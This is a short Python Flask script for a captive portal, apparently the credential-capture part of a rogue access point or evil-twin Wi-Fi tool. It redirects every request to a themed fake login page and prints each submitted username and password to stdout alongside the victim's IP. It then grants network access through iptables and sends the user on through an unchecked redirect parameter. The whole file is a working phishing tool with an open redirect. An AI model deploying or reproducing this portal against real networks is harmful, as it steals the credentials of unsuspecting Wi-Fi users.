#!/usr/bin/env python2.7

from flask import Flask, request, redirect, render_template,Response
import urllib
import os,sys
import subprocess
import argparse

# app = Flask(__name__,static_url_path='/templates/flask/static', 
#             static_folder='templates/flask/static',
#             template_folder='templates/flask')
app = Flask(__name__)

def login_user(ip):
    subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", ip, "-j" ,"ACCEPT"])
    subprocess.call(["iptables", "-I", "FORWARD", "-s", ip, "-j" ,"ACCEPT"])

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST' and 'login' in request.form and 'password' in request.form:
        sys.stdout.write(str({ request.remote_addr: {"login": request.form['login'], "password": request.form['password']}}))
        sys.stdout.flush()
        login_user(request.remote_addr)
        if 'orig_url' in request.args and len(request.args['orig_url']) > 0:
            return redirect(urllib.unquote(request.args['orig_url']))
        else:
            return render_template('templates/login_successful.html')
    else:
        return render_template('templates/login.html', orig_url=urllib.urlencode({'orig_url': request.args.get('orig_url', '')}))

@app.route('/favicon.ico')
def favicon():
    return app.send_static_file('templates/favicon.ico')


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    global REDIRECT
    return redirect("http://{}/login?".format(REDIRECT) + urllib.urlencode({'orig_url': request.url}))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--tamplate' ,dest = 'template', help='path the theme login captive portal')
    parser.add_argument('-s','--static' ,dest = 'static', help='path  of the static files from webpage')
    parser.add_argument('-r','--redirect' ,dest = 'redirect', help='IpAddress from gataway captive portal')
    args = parser.parse_args()
    REDIRECT = args.redirect

    app.static_url_path = '\{}'.format(args.static)
    app.static_folder= '{}'.format(args.static)
    app.template_folder= args.template
    
    app.run('0.0.0.0', port=80)
